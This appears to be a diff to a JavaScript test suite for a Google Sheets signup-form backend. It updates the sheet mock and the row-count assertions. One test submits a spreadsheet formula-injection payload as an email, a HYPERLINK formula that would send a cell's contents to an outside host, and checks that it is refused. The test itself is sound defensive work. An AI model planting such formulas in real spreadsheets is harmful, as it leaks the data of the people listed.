@@ -28,7 +28,11 @@ function makeSheet(name) {
     setName: (n) => { sheet.name = n; return sheet; },
     getLastRow: () => sheet.rows.length,
     appendRow: (row) => { sheet.rows.push(row.map(armazenar)); return sheet; },
-    getDataRange: () => ({ getValues: () => sheet.rows.map((r) => r.slice()) }),
+    // Como no Google Sheets: um retângulo, com '' nas células vazias.
+    getDataRange: () => ({ getValues: () => {
+      const largura = Math.max(0, ...sheet.rows.map((r) => r.length));
+      return sheet.rows.map((r) => Array.from({ length: largura }, (_, j) => (r[j] === undefined ? '' : r[j])));
+    } }),
     hideSheet: () => { sheet.hidden = true; },
     setFrozenRows: () => {},
     setColumnWidth: () => {},
@@ -46,10 +50,15 @@ function makeSheet(name) {
         setValues: (vals) => { ensure(); vals.forEach((row, i) => row.forEach((v, j) => { sheet.rows[r - 1 + i][c - 1 + j] = armazenar(v); })); },
         setValue: (v) => { ensure(); sheet.rows[r - 1][c - 1] = armazenar(v); },
         setFontWeight: () => {},
-        setDataValidation: (rule) => { sheet.validations.push({ r, c, nr, nc, rule }); },
+        setDataValidation: (rule) => {
+          sheet.validations.push({ r, c, nr, nc, rule });
+          // Como no Google Sheets: caixinhas vazias valem FALSE e contam como linhas ocupadas (até a linha 1000).
+          if (rule === 'checkbox') for (let row = r; row <= 1000; row++) { ensureRow(row); if (sheet.rows[row - 1][c - 1] === undefined) sheet.rows[row - 1][c - 1] = false; }
+        },
       };
     },
   };
+  const ensureRow = (row) => { while (sheet.rows.length < row) sheet.rows.push([]); };
   return sheet;
 }
 
@@ -118,6 +127,9 @@ function world(opts = {}) {
   };
   return { context, ss, props, cache, fetches, mails, http, clock, call, contatos, tokens, clearCache, ultimoToken, triggers, marcar };
 }
+
+// Linhas da aba Contatos com e-mail (o cabeçalho conta como 1; as caixinhas vão até a linha 1000).
+const linhasComEmail = (w) => w.contatos().filter((r) => r[2]).length;
 
 const ana = { action: 'cadastrar', nome: 'Ana', whatsapp: '(14) 99999-0000', email: 'ana@x.com' };
 
@@ -199,7 +211,7 @@ test('edições fora da caixinha são ignoradas', () => {
 test('cadastro novo grava "Não", envia pelo Brevo e guarda só o hash do token', () => {
   const w = world();
   assert.deepEqual(w.call(ana), { ok: true });
-  assert.equal(w.contatos().length, 2);
+  assert.equal(linhasComEmail(w), 2);
   assert.deepEqual(w.contatos()[1].slice(0, 4), ['Ana', '(14) 99999-0000', 'ana@x.com', 'Não']);
   assert.equal(w.fetches.length, 1);
   assert.equal(w.fetches[0].url, 'https://api.brevo.com/v3/smtp/email');
@@ -213,12 +225,23 @@ test('cadastro novo grava "Não", envia pelo Brevo e guarda só o hash do token'
   assert.equal(w.mails.length, 0);
 });
 
+test('cadastros novos vão para a linha logo abaixo do último contato, mesmo com caixinhas até o fim', () => {
+  const w = world();
+  w.call(ana);
+  w.clearCache();
+  w.call(Object.assign({}, ana, { nome: 'Bia', email: 'bia@x.com' }));
+  assert.equal(w.contatos()[1][2], 'ana@x.com');
+  assert.equal(w.contatos()[2][2], 'bia@x.com');
+  assert.equal(w.contatos()[2][7], false); // a caixinha da linha continua lá
+  assert.equal(w.contatos().length, 1000);
+});
+
 test('e-mail com maiúsculas e espaços cai na mesma linha', () => {
   const w = world();
   w.call(Object.assign({}, ana, { email: '  Ana@X.com ' }));
   w.clearCache();
   w.call(ana);
-  assert.equal(w.contatos().length, 2);
+  assert.equal(linhasComEmail(w), 2);
 });
 
 test('segundo pedido em menos de 60 s é recusado sem enviar', () => {
@@ -233,7 +256,7 @@ test('segundo pedido em menos de 60 s é recusado sem enviar', () => {
 test('campo escondido preenchido: responde ok e não grava nem envia', () => {
   const w = world();
   assert.deepEqual(w.call(Object.assign({}, ana, { site: 'http://spam' })), { ok: true });
-  assert.equal(w.contatos().length, 1);
+  assert.equal(linhasComEmail(w), 1);
   assert.equal(w.fetches.length + w.mails.length, 0);
 });
 
@@ -275,7 +298,7 @@ test('e-mail que começa com = ou - é recusado', () => {
   const r = w.call(Object.assign({}, ana, { email: '=hyperlink("http://x/?"&a3,"x")&"@x.co"' }));
   assert.equal(r.erro, 'Informe um e-mail válido.');
   assert.equal(w.call(Object.assign({}, ana, { email: '-a@x.co' })).erro, 'Informe um e-mail válido.');
-  assert.equal(w.contatos().length, 1);
+  assert.equal(linhasComEmail(w), 1);
 });
 
 test('nome pendente com = continua texto depois de confirmar', () => {
